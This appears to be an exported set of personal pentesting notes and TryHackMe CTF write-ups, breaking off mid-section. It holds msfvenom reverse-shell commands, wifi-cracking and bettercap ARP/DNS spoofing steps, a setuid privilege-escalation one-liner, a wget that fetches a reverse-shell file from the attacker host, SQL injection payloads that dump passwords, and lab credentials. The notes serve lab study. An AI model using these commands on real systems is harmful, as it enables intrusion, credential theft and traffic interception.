class='title level-3'>find</h1><br/><p><span style="color:#3f4043;">Linux:</span></p><p>find / -type f | grep &quot;proof.txt&quot;</p><p>root.txt</p><p>flag.txt</p><p></p><p>find / -type f -name &quot;*id_rsa*&quot; 2&gt;/dev/null</p><p></p><p><span style="color:#3f4043;">Windows:</span></p><p>dir /s /b proof.txt</p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--ssh_algorithm_issues_254.html"></a><h1 class='title level-3'>ssh algorithm issues</h1><br/><p><a href="https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss">https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss</a></p><p></p><p><span style="color:#3f4043;">When it give you error, simply search it on google and try the various solutions rq. </span></p><p></p><p><span style="color:#3f4043;">You can also try simply specifying one algorhitm like so, even if it asked for way more, and it will often work.</span></p><p></p><p>ssh -o KexAlgorithms=ecdh-sha2-nistp256 sean@10.11.1.251</p><p></p><p>=====================</p><p></p><p><span style="color:#3f4043;">improved ssh config:</span></p><p></p><p>gedit /etc/ssh/ssh_config</p><p></p><p></p><p></p><p># This is the ssh client system-wide configuration file.  See</p><p># ssh_config(5) for more information.  This file provides defaults for</p><p># users, and the values can be changed in per-user configuration files</p><p># or on the command line.</p><p></p><p># Configuration data is parsed as follows:</p><p>#  1. command line options</p><p>#  2. user-specific file</p><p>#  3. system-wide file</p><p># Any configuration value is only changed the first time it is set.</p><p># Thus, host-specific definitions should be at the beginning of the</p><p># configuration file, and defaults at the end.</p><p></p><p># Site-wide defaults for some commonly used options.  For a comprehensive</p><p># list of available options, their meanings and defaults, please see the</p><p># ssh_config(5) man page.</p><p></p><p>Include /etc/ssh/ssh_config.d/*.conf</p><p></p><p>Host *</p><p>#   ForwardAgent no</p><p>#   ForwardX11 no</p><p>#   ForwardX11Trusted yes</p><p>#   PasswordAuthentication yes</p><p>#   HostbasedAuthentication no</p><p>#   GSSAPIAuthentication no</p><p>#   GSSAPIDelegateCredentials no</p><p>#   GSSAPIKeyExchange no</p><p>#   GSSAPITrustDNS no</p><p>#   BatchMode no</p><p>#   CheckHostIP yes</p><p>#   AddressFamily any</p><p>#   ConnectTimeout 0</p><p>#   StrictHostKeyChecking ask</p><p>#   IdentityFile ~/.ssh/id_rsa</p><p>#   IdentityFile ~/.ssh/id_dsa</p><p>#   IdentityFile ~/.ssh/id_ecdsa</p><p>#   IdentityFile ~/.ssh/id_ed25519</p><p>#   Port 22</p><p>#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc</p><p>#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com</p><p>#   EscapeChar ~</p><p>#   Tunnel no</p><p>#   TunnelDevice any:any</p><p>#   PermitLocalCommand no</p><p>#   VisualHostKey no</p><p>#   ProxyCommand ssh -q -W %h:%p gateway.example.com</p><p>#   RekeyLimit 1G 1h</p><p>#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k</p><p>    SendEnv LANG LC_*</p><p>    HashKnownHosts yes</p><p>    GSSAPIAuthentication yes</p><p>    HostKeyAlgorithms=+ssh-dss</p><p>    KexAlgorithms diffie-hellman-group14-sha1</p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--msfvenom_payloads_263.html"></a><h1 class='title level-3'>msfvenom payloads</h1><br/><p><span style="color:#3f4043;">Find payloads:</span></p><p><a href="https://burmat.gitbook.io/security/hacking/msfvenom-cheetsheet">https://burmat.gitbook.io/security/hacking/msfvenom-cheetsheet</a></p><p>msfvenom -l payloads | grep -i windows</p><p>msfvenom -l payloads | grep -i linux</p><p>msfvenom -l payloads | grep -i java</p><p></p><p><h2>Classic shells:</h2></p><p></p><p><span style="color:#3f4043;">Staged:</span></p><p>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe</p><p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe</p><p></p><p><span style="color:#3f4043;">Stageless:</span></p><p>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe</p><p>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe</p><p></p><p><span style="color:#3f4043;">Linux:</span></p><p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf &gt; shell.elf</p><p>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f elf -o scp</p><p></p><p><span style="color:#3f4043;">javascript revshell with generic none: (worked well with this MongoDB 2.2.3 exploit: </span><a href="https://www.exploit-db.com/exploits/24947">https://www.exploit-db.com/exploits/24947</a><span style="color:#3f4043;">)</span></p><p>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.198 LPORT=443 CMD=/bin/bash -f js_le -e generic/none</p><p></p><p></p><p><span style="color:#3f4043;">java revshell:</span></p><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f raw &gt; shell.jsp</p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--kali_network_fix_271.html"></a><h1 class='title level-3'>kali network fix</h1><br/><p>kali network issues fix:</p><p></p><p><a href="https://www.youtube.com/watch?v=iWedhiiVWDA&t=342s">https://www.youtube.com/watch?v=iWedhiiVWDA&amp;t=342s</a></p><p><a href="https://www.youtube.com/watch?v=w36Alfs7VBM">https://www.youtube.com/watch?v=w36Alfs7VBM</a></p><p></p><p>reboot</p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--make_wordlists_428.html"></a><h1 class='title level-3'>make wordlists</h1><br/><p>Copy paste all the usernames to users.txt, but because of it&#39;s formatting we must change it to be suitable for a wordlist. Let&#39;s remove the “,” and replace the with “ ”, then, lets add each word to a new line. We procceed like so:</p><p></p><p>gedit users.txt</p><p><img src="images/428-1.png" alt="images/428-1.png" /></p><p></p><p><img src="images/428-2.png" alt="images/428-2.png" /></p><p></p><p><img src="images/428-3.png" alt="images/428-3.png" /></p><p></p><p></p><p>cat users.txt| tr &#39; &#39; &#39;\n&#39; &gt; userlist.txt</p><p></p><p><img src="images/428-4.png" alt="images/428-4.png" /></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--link_binary_to_current_path_474.html"></a><h1 class='title level-3'>link binary to current path</h1><br/><p>sudo ln -s /opt/jwt_tool/jwt_tool.py /usr/bin/jwt_tool</p><p></p><p></p><p></p><p><h3>echo &quot;alias urless=&#39;python3 $PWD/urless.py&#39;&quot; &gt;&gt; ~/.zshrc </h3><h3></h3></p><p><h3>source ~/.zsshrc</h3></p><p></p><p></p><p></p><p>sudo ln -s /opt/ParamSpider/paramspider.py /usr/bin/paramspider</p><p>echo &#39;export PATH=$PATH:/opt/ParamSpider&#39; &gt;&gt; ~/.zshrc</p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--docker-compose_477.html"></a><h1 class='title level-3'>docker-compose</h1><br/><p></p><p></p><p>sudo docker-compose -f docker-compose.yml --compatibility up -d</p><p>sudo docker-compose start</p><p>sudo docker-compose down</p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--parsing_data_478.html"></a><h1 class='title level-3'>parsing data</h1><br/><p></p><p><span style="color:#3f4043;">Useful ways of to quickly parse data.</span></p><p></p><p></p><p>gedit find and replace, then cut everything after @ for example.</p><p><span style="color:#3f4043;">Will take all text after ‘@’ and remove it.</span></p><p>cat ja | cut -d &#39;@&#39; -f1 &gt; endpoints</p><p></p><p><span style="color:#3f4043;">Will take all text before ‘@’ and remove it.</span></p><p>cat ja | cut -d &#39;@&#39; -f1 &gt; endpoints</p><p></p><p></p><p><span style="color:#3f4043;">Will replace a space with a newline to create a wordlist:</span></p><p>cat users.txt | tr &#39; &#39; &#39;\n&#39; &gt; userlist.txt</p><p></p><p><span style="color:#3f4043;">This command uses sed to replace the end-of-line anchor $ with @parkersmaplebarn.com for each line in the users.txt file. The resulting output is then saved to the userlist.txt file.</span></p><p>sed -e &#39;s/$/@parkersmaplebarn.com/&#39; users.txt &gt; userlist.txt</p><p></p><p></p><p></p><p><span style="color:#3f4043;">Very useful when text fields are split vertically and has a bunch of trailing spaces:</span></p><p>head hash | awk &#39;{print $1}&#39;</p><p>head hash | awk &#39;{print $2}&#39;</p><p></p><p><img src="images/478-1.png" alt="images/478-1.png" /></p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--ASCII_table_and_encoding_484.html"></a><h1 class='title level-3'>ASCII table and encoding</h1><br/><p></p><p></p><p></p><p></p><p><a href="https://i.pinimg.com/736x/95/dd/c8/95ddc8a6c29eb2187336c8b5efd31c28--ascii-programming.jpg"><img src="images/484-1.png" alt="images/484-1.png" /></a></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--regex_507.html"></a><h1 class='title level-3'>regex</h1><br/><p></p><p>Regex 101:</p><p></p><p><img src="images/507-1.png" alt="images/507-1.png" /></p><p></p><p><span style="color:#3f4043;">Grepping for usernames: (6-12 character long, a-z characters, upper and lowercase 0-9 numbers)</span></p><p>egrep &#39;^[a-ZA-Z0-9]{6,12}$&#39; filename.txt</p><p></p><p><span style="color:#3f4043;">Grepping for emails: (contains &#39;.&#39; and &#39;@&#39; symbols)</span></p><p>egrep &#39;^.+@.+\.com$&#39; filename.txt</p><p></p><p><span style="color:#3f4043;">Grepping for websites:</span></p><p>grep -Eo &#39;(http|https)://[^?&quot;]+&#39;</p><p></p><p>Grepping for Names:</p><p>grep -xE &#39;^[A-Z][a-z]+$&#39; </p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--wifi_hacking_840.html"></a><h1 class='title level-3'>wifi hacking</h1><br/><p><a href="https://github.com/FluxionNetwork/fluxion">https://github.com/FluxionNetwork/fluxion</a></p><p></p><p>2, 1, 3, 2, 1</p><p></p><p>editcap -F pcap firstcapture.cap wpa-capture.pcap</p><p></p><p></p><p></p><p></p><p></p><p><h3>sudo airmon-ng check kill </h3></p><p><h3>sudo airmon-ng start wlan0 </h3></p><p></p><p>=================</p><p><span style="color:#3f4043;">Preferred way:</span></p><p>apt install hcxtools -y</p><p></p><p>airmon-ng start wlan0</p><p>sudo hcxdumptool -i wlan0 -w hcxdump.pcap</p><p>hcxpcapngtool hcxdump.pcap -o hc.hc22000</p><p>.\hashcat.exe -m 22000 -a 3 ?d?d?d?d?d?d?d?d -w 3 -O -force</p><p>C:\Users\Christopher\Downloads\hashcat-6.2.6&gt;.\hashcat.exe -w3 -O -S -m 22000 hcxdump2.hc22000 ..\mystery-list.txt</p><p></p><p></p><p>.\hashcat.exe -m 22000 .\new_hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 9 ?d?d?d?d?d?d?d?d -O --force -w 3</p><p>hashcat.exe -m 22000 hash.hc22000 rockyou.txt -r 2.rule</p><p>hashcat.exe -m 22000 hash.hc22000 norwegian.txt -r 2.rule</p><p></p><p><a href="https://github.com/Ondkloss/norwegian-wordlist/blob/master/wordlist_20220201_norsk_ordbank_nob_2005.txt">https://github.com/Ondkloss/norwegian-wordlist/blob/master/wordlist_20220201_norsk_ordbank_nob_2005.txt</a></p><p><a href="https://github.com/ignis-sec/Pwdb-Public/blob/master/wordlists/ignis-10M.txt">https://github.com/ignis-sec/Pwdb-Public/blob/master/wordlists/ignis-10M.txt</a></p><p></p><p><a href="#Methdology--Cracking_&_Bruteforcing--Hashcat_412.html">Hashcat</a></p><p></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--wifi_hacking--drop_wifi_passwords_861.html"></a><h1 class='title level-4'>drop wifi passwords</h1><br/><p>netsh wlan show profile</p><p>netsh wlan show profile name=wifi_name key=clear</p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--wifi_hacking--bettercap_932.html"></a><h1 class='title level-4'>bettercap</h1><br/><p><span style="color:#3f4043;">#This allows you to watch domains user goes to, intercept all http traffic, and also potentially do arp spoofing and dns redirection.</span></p><p></p><p>bettercap</p><p></p><p>net.probe on</p><p>net.show</p><p>set arp.spoof.targets 10.0.0.1</p><p>arp.spoof on</p><p>net.sniff on</p><p></p><p>set dns.spoof.domains ni.com</p><p>dns.spoof on</p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--wifi_hacking--Wifi_adapter_fix_in_virtualbox_940.html"></a><h1 class='title level-4'>Wifi adapter fix in virtualbox</h1><br/><p>WIFI ADAPTER &lt;3</p><p></p><p>apt install linux-headers-6.6.15-amd64 -y</p><p>apt install realtek-rtl88xxau-dkms -y</p><p></p><p>install guest additions</p><p>and add the USB device in virtualbox, and use USB 3.0</p></div><div class='page'><a name="Methdology--CTF_Boxes_152.html"></a><h1 class='title level-2'>CTF Boxes</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe_368.html"></a><h1 class='title level-3'>TryHackMe</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Annie_369.html"></a><h1 class='title level-4'>Annie</h1><br/><p>nmap -sV -sC -p 22,7070,30365 10.10.107.36 -v -Pn</p><p></p><p>22/tcp    open   ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)</p><p>|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)</p><p>|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)</p><p>7070/tcp  open   <span style="color:#ed333b;">ssl/realserver?</span></p><p>|_ssl-date: TLS randomness does not represent time</p><p>| ssl-cert: Subject: commonName=<span style="color:#ed333b;">AnyDesk Client</span></p><p>| Issuer: commonName=<span style="color:#ed333b;">AnyDesk Client</span></p><p>| Public Key type: rsa</p><p>| Public Key bits: 2048</p><p>| Signature Algorithm: sha256WithRSAEncryption</p><p>| Not valid before: 2022-03-23T20:04:30</p><p>| Not valid after:  2072-03-10T20:04:30</p><p>| MD5:   3e57 6c44 bf60 ef79 7999 8998 7c8d bdf0</p><p>|_SHA-1: ce6c 79fb 669d 9b19 5382 8cec c8d5 50b6 2e36 475b</p><p>30365/tcp closed unknown</p><p></p><p></p><p></p><p>searchsploit -m linux/remote/49613.py</p><p></p><p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.31.108 LPORT=443 -b &quot;\x00\x25\x26&quot; -f python -v shellcode</p><p>#add into script, use default port (50001, its UDP)</p><p> </p><p></p><p>get shell</p><p><img src="images/369-1.png" alt="images/369-1.png" /></p><p></p><p></p><p>============================</p><p></p><p>Privesc</p><p></p><p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/</a></p><p></p><p>find / -type f -perm -04000 -ls 2&gt;/dev/null</p><p><img src="images/369-2.png" alt="images/369-2.png" /></p><p></p><p></p><p>cd /tmp</p><p>whereis python3</p><p>cp /usr/bin/python3 .</p><p>setcap cap_setuid+ep python3</p><p>./python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</p><p></p><p></p><p></p><p><img src="images/369-3.png" alt="images/369-3.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--overpass_376.html"></a><h1 class='title level-4'>overpass</h1><br/><p>ports</p><p>22 OpenSSH 7.6p1</p><p></p><p>80 Golang net/http server</p><p>[00:01:50] 301 -    0B  - /aboutus  -&gt;  aboutus/                           </p><p>[00:01:51] 301 -   42B  - /admin  -&gt;  /admin/                               </p><p>[00:01:55] 301 -    0B  - /css  -&gt;  css/                                    </p><p>[00:01:57] 301 -    0B  - /downloads  -&gt;  downloads/                        </p><p>[00:02:00] 301 -    0B  - /img  -&gt;  img/                                    </p><p>[00:02:01] 301 -    0B  - /index.html  -&gt;  ./                               </p><p>[00:02:11] 301 -    0B  - /render/<a href="https://www.google.com">https://www.google.com</a>  -&gt;  /render/https:/<a href="http://www.google.com">www.google.com</a></p><p></p><p></p><p>/admin had a cookie auth bypass.</p><p><img src="images/376-1.png" alt="images/376-1.png" /></p><p></p><p> You can see the sourcecode of it in /login.js</p><p></p><p><img src="images/376-2.png" alt="images/376-2.png" /></p><p></p><p>Got ssh creds, cracked encrypted private key</p><p><img src="images/376-3.png" alt="images/376-3.png" /></p><p></p><p><img src="images/376-4.png" alt="images/376-4.png" /></p><p></p><p>Added myself as the hostip for this domain</p><p><img src="images/376-5.png" alt="images/376-5.png" /></p><p></p><p></p><p>simulated similar file structure as the server, this is needed. And made a simple bash script for when root executes the curl request through bash</p><p><img src="images/376-6.png" alt="images/376-6.png" /></p><p></p><p>It triggered, and we run the /bin/bash suid binary and get root!</p><p><img src="images/376-7.png" alt="images/376-7.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--ollie_379.html"></a><h1 class='title level-4'>ollie</h1><br/><p>found creds through port 1337</p><p></p><p>admin</p><p>OllieUnixMontgomery!</p><p></p><p>searchsploit -m php/webapps/50963.py</p><p></p><p>python3 50963.py -url <a href="http://10.10.234.38/">http://10.10.234.38/</a> -usr admin -pwd &#39;OllieUnixMontgomery!&#39; -cmd &#39;wget <a href="http://10.108/rev4.php">http://10.108/rev4.php</a> -O /tmp/rev6.php&#39;</p><p></p><p><a href="http://10.10.234.38/evil.php?cmd=php%20-f%20/tmp/rev6.php">http://10.10.234.38/evil.php?cmd=php%20-f%20/tmp/rev6.php</a></p><p></p><p>shell :)</p><p></p><p>========================</p><p>PRIVESC</p><p></p><p></p><p></p><p>su ollie </p><p>OllieUnixMontgomery!</p><p></p><p></p><p>Ran pspy64 and saw this process ran by UID (root)</p><p><img src="images/379-1.png" alt="images/379-1.png" /></p><p></p><p>And as you can see the members in the group of ollie (us) can read and write into this file owned by root, however we can not execute it. We have to wait till root triggers this binary again. </p><p></p><p>However this process is not part of a cronjob, so we needed pspy to be able to see this.</p><p><img src="images/379-2.png" alt="images/379-2.png" /></p><p></p><p>I wrote this in the file instead:</p><p><img src="images/379-3.png" alt="images/379-3.png" /></p><p></p><p>Now just waiting for root to use this process </p><p></p><p></p><p>I forgot the “#!/bin/bash” part of the script, and that seems to have prevented me to give /bin/bash suid binary at first, however it is now fixed</p><p></p><p><img src="images/379-4.png" alt="images/379-4.png" /></p><p></p><p>As you can see this process got ran by UID 0 (root) again and this time executed the script we modified with olly</p><p></p><p>And we are root!</p><p></p><p><img src="images/379-5.png" alt="images/379-5.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Vulnnet_Endgame_420.html"></a><h1 class='title level-4'>Vulnnet_Endgame</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Vulnnet_Endgame--ports_421.html"></a><h1 class='title level-5'>ports</h1><br/><p># Nmap 7.92 scan initiated Sun Oct  2 21:14:15 2022 as: nmap -sC -sV -Pn -oN nmap_full -vvv -p 22,80 10.10.231.35</p><p>Nmap scan report for vulnnet.thm (10.10.231.35)</p><p>Host is up, received user-set (0.31s latency).</p><p>Scanned at 2022-10-02 21:14:15 EDT for 17s</p><p></p><p>PORT   STATE SERVICE REASON         VERSION</p><p>22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)</p><p>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQRQ5sGPZniwdg1TNW71UdA6dc2k3lpZ68EnacCUgKEqZT7sBvppGUJjSAMY7aZqdZJ0m5N9SQajB9iW3ZEKHM5qtbXOadbWkRKp3VrqtZ8VW1IthLa2+oLObY2r1qep6O2NqrghQ/yVCbJYF5H8BsTtjCVNBeVSzf9zetwUviO6xfqIRO3iM+8S2WpZwKGtrBFvA9RaBsqLBGB1XGUjufKxyRUzOx1J2I94Xhs/bDcaOV5Mw6xhSTxgS3q6xVmL6UU3hIbpiXzYcj2vxuAXXszyZCM4ZkxmQ1fddQawxHfmZRnqxVogoHDsOGgh9tpQsc+S/KTrYQa9oFEVARV70x</p><p>|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)</p><p>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg9Hw4CIelacGVS0U+uFcwEj183dT+WrY/tvJV4U8/1alrGM/8gIKHEQIsU4yGPtyQ6M8xL9q7ak6ze+YsHd2o=</p><p>|   256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)</p><p>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJDCCks5eMviLJyDQY/oQ3LLgnDoXvqZS0AxNAJGv9T</p><p>80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))</p><p>| http-methods: </p><p>|_  Supported Methods: HEAD GET POST OPTIONS</p><p>|_http-title: Soon &amp;mdash; Fully Responsive Software Design by VulnNet</p><p>|_http-server-header: Apache/2.4.29 (Ubuntu)</p><p>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Vulnnet_Endgame--HTTP_422.html"></a><h1 class='title level-5'>HTTP</h1><br/><p></p><p>add <a href="http://vulnnet.thm">vulnnet.thm</a> to /etc/hosts</p><p></p><p>VHOST Discovery:</p><p>ffuf -u &#39;<a href="http://vulnnet.thm/'">http://vulnnet.thm/&#39;</a> -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 -H &quot;Host: FUZZ.vulnnet.thm&quot; -fs 65</p><p></p><p><img src="images/422-1.png" alt="images/422-1.png" /></p><p></p><p>add these to /etc/hosts</p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Vulnnet_Endgame--HTTP--vulnnet.thm_423.html"></a><h1 class='title level-6'>vulnnet.thm</h1><br/><p>Nothing interesting found here. Proceeded to subdomain enumeration. </p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Vulnnet_Endgame--HTTP--blog.vulnnet.thm_424.html"></a><h1 class='title level-6'>blog.vulnnet.thm</h1><br/><p><img src="images/424-1.png" alt="images/424-1.png" /></p><p></p><p>As you can see, it utilizes the api from the api.vulnnet.thm subdomain to fetch its call</p><p></p><p>There was nothing else I could find which was interesting. </p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Vulnnet_Endgame--HTTP--shop.vulnnet.thm_425.html"></a><h1 class='title level-6'>shop.vulnnet.thm</h1><br/><p>so far not too interesting</p><p></p><p>maybe some paramaters i could test more with sqli, css, command injection, but so far nothing easy</p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Vulnnet_Endgame--HTTP--api.vulnnet.thm_426.html"></a><h1 class='title level-6'>api.vulnnet.thm</h1><br/><p>Testing for SQLI and determining columns:</p><p></p><p>blog=1 UNION SELECT NULL--</p><p><img src="images/426-1.png" alt="images/426-1.png" /></p><p>blog=1 UNION SELECT NULL,NULL--</p><p><img src="images/426-2.png" alt="images/426-2.png" /></p><p>blog=1 UNION SELECT NULL,NULL--</p><p><img src="images/426-3.png" alt="images/426-3.png" /></p><p>AND BAM, We can see it&#39;s reflecting our response in this UNION query. </p><p></p><p></p><p>So we now know this is vulnerable to SQLI injection and that it contains 3 columns. </p><p></p><p></p><p></p><p>?blog=-23232 union select null,null,@@version--</p><p><img src="images/426-4.png" alt="images/426-4.png" /></p><p></p><p>By using a page that doesn&#39;t exist in the blog paramater, the MySQL resposnse gets reflected in the status section</p><p></p><p><img src="images/426-5.png" alt="images/426-5.png" /></p><p>As you can see; this is not the information we seek. </p><p></p><p><img src="images/426-6.png" alt="images/426-6.png" /></p><p></p><p>?blog=-51512 UNION SELECT null, username, password from users--</p><p><img src="images/426-7.png" alt="images/426-7.png" /></p><p></p><p>?blog=-51512 union select NULL, NULL, group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata--</p><p><img src="images/426-8.png" alt="images/426-8.png" /></p><p></p><p>Very interesting technique. </p><p></p><p></p><p></p><p>?blog=-51512 union select NULL, NULL, group_concat(password) from users--</p><p><img src="images/426-9.png" alt="images/426-9.png" /></p><p></p><p></p><p>?blog=-51512 union select NULL, group_concat(username), group_concat(password) from users--</p><p><img src="images/426-10.png" alt="images/426-10.png" /></p><p></p><p>Copy paste all the usernames to users.txt, but because of it&#39;s formatting we must change it to be suitable for a wordlist. Let&#39;s remove the “,” and replace the with “ ”, then, lets add each word to a new line. We procceed like so:</p><p></p><p>gedit users.txt</p><p><img src="images/426-11.png" alt="images/426-11.png" /></p><p></p><p><img src="images/426-12.png" alt="images/426-12.png" /></p><p></p><p><img src="images/426-13.png" alt="images/426-13.png" /></p><p></p><p></p><p>cat users.txt| tr &#39; &#39; &#39;\n&#39; &gt; userlist.txt</p><p></p><p><img src="images/426-14.png" alt="images/426-14.png" /></p><p></p><p></p><p>BAM, its fixed. </p><p></p><p>Let&#39;s do the same with the passwords, done</p><p></p><p></p><p>?blog=-51512 union select NULL,NULL,group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=&#39;vn_admin&#39;--</p><p><img src="images/426-15.png" alt="images/426-15.png" /></p><p></p><p>?blog=-51512 union select NULL, NULL, group_concat(table_name, &#39;:&#39;, column_name) from INFORMATION_SCHEMA.columns where table_schema=&#39;vn_admin&#39;--</p><p><img src="images/426-16.png" alt="images/426-16.png" /></p><p></p><p>?blog=-51512 union select NULL,NULL,group_concat(username) from vn_admin.be_users--</p><p><img src="images/426-17.png" alt="images/426-17.png" /></p><p></p><p>?blog=-51512 union select NULL,NULL,group_concat(password) from vn_admin.be_users--</p><p><img src="images/426-18.png" alt="images/426-18.png" /></p><p></p><p><img src="images/426-19.png" alt="images/426-19.png" /></p><p></p><p>we crack chris w user with one of the passwords of thte users in the blog database. For some reasons when I retrieved the passwords myself, it didn&#39;t capture all of them, but sqlmap did. Unsure why. Regardless, here&#39;s our creds</p><p>FIXED :DDD&lt;3</p><p></p><p></p><p><a href="http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=-3%20UNION%20SELECT%20json_arrayagg(concat_ws(0x3a,%20password)),%20null,null%20from%20blog.users;--">http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=-3%20UNION%20SELECT%20json_arrayagg(concat_ws(0x3a,%20password)),%20null,null%20from%20blog.users;--</a></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Vulnnet_Endgame--HTTP--admin1.vulnnet.thm_427.html"></a><h1 class='title level-6'>admin1.vulnnet.thm</h1><br/><p>└─# gobuster dir -u <a href="http://admin1.vulnnet.thm">http://admin1.vulnnet.thm</a> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt                    130 ⨯</p><p>===============================================================</p><p>Gobuster v3.1.0</p><p>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</p><p>===============================================================</p><p>[+] Url:                     <a href="http://admin1.vulnnet.thm">http://admin1.vulnnet.thm</a></p><p>[+] Method:                  GET</p><p>[+] Threads:                 10</p><p>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</p><p>[+] Negative Status codes:   404</p><p>[+] User Agent:              gobuster/3.1.0</p><p>[+] Timeout:                 10s</p><p>===============================================================</p><p>2022/10/03 12:48:37 Starting gobuster in directory enumeration mode</p><p>===============================================================</p><p>/en                   (Status: 301) [Size: 321] [--&gt; <a href="http://admin1.vulnnet.thm/en/]">http://admin1.vulnnet.thm/en/]</a></p><p>/vendor               (Status: 301) [Size: 325] [--&gt; <a href="http://admin1.vulnnet.thm/vendor/]">http://admin1.vulnnet.thm/vendor/]</a></p><p>/fileadmin            (Status: 301) [Size: 328] [--&gt; <a href="http://admin1.vulnnet.thm/fileadmin/]">http://admin1.vulnnet.thm/fileadmin/]</a></p><p>/typo3temp            (Status: 301) [Size: 328] [--&gt; <a href="http://admin1.vulnnet.thm/typo3temp/]">http://admin1.vulnnet.thm/typo3temp/]</a></p><p>/typo3                (Status: 301) [Size: 324] [--&gt; <a href="http://admin1.vulnnet.thm/typo3/]">http://admin1.vulnnet.thm/typo3/]</a>    </p><p>/typo3conf            (Status: 301) [Size: 328] [--&gt; <a href="http://admin1.vulnnet.thm/typo3conf/]">http://admin1.vulnnet.thm/typo3conf/]</a></p><p></p><p></p><p>login:</p><p></p><p>chris_w</p><p>vAxWtmNzeTz</p><p></p><p></p><p><img src="images/427-1.png" alt="images/427-1.png" /></p><p>Let&#39;s delete this. It&#39;s used for filtering file extensions</p><p></p><p><img src="images/427-2.png" alt="images/427-2.png" /></p><p></p><p>BAM</p><p></p><p><img src="images/427-3.png" alt="images/427-3.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--TryHackMe--Vulnnet_Endgame--HTTP--privesc_429.html"></a><h1 class='title level-6'>privesc</h1><br/><p></p><p>8y7TKQDpucKBYhwsb</p><p></p><p>ssh 